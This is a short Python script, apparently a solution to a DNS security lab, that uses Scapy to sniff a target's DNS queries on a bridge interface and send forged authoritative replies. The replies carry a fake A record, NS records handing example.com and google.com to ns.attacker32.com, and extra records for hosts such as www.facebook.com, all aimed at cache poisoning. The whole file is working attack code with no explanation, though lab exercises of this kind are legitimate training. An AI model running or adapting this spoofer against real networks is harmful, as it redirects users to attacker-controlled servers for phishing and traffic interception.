#!/usr/bin/env python3

from scapy.all import *
import sys

target  = sys.argv[1]
NS_NAME = "example.com"

def spoof_dns(pkt):
    if (DNS in pkt and NS_NAME in pkt[DNS].qd.qname.decode('utf-8')):
        print(pkt.sprintf("{DNS: %IP.src% --> %IP.dst%: %DNS.id%}"))

        sniffed_ip  = pkt[IP]
        sniffed_udp = pkt[UDP]
        sniffed_dns = pkt[DNS]

        ip       = IP(src=sniffed_ip.dst, dst=sniffed_ip.src)
        udp      = UDP(sport=53, dport=sniffed_udp.sport)
        Anssec   = DNSRR(rrname=sniffed_dns.qd.qname, type="A", ttl=259200, rdata="1.2.3.4")
        Nssec1   = DNSRR(rrname="example.com", type="NS", rdata="ns.attacker32.com", ttl=259200)
        Nssec2   = DNSRR(rrname="google.com", type="NS", rdata="ns.attacker32.com", ttl=259200)
        Addsec1  = DNSRR(rrname="ns.attacker32.com", type="A", rdata="1.2.3.4", ttl=259200)
        Addsec2  = DNSRR(rrname="ns.example.net", type="A", rdata="5.6.7.8", ttl=259200)
        Addsec3  = DNSRR(rrname="www.facebook.com", type="A", rdata="3.4.5.6", ttl=259200)
        dns      = DNS(id=sniffed_dns.id, qd=sniffed_dns.qd, aa=1, rd=0, qr=1, qdcount=1, ancount=1, nscount=2, arcount=3, an=Anssec, ns=Nssec1/Nssec2, ar=Addsec1/Addsec2/Addsec3)
        spoofpkt = ip/udp/dns
        
        send(spoofpkt)

myFilter = "udp and (src host {} and dst port 53)".format(target)
pkt = sniff(iface="br-9dc788eb17b7", filter=myFilter, prn=spoof_dns)
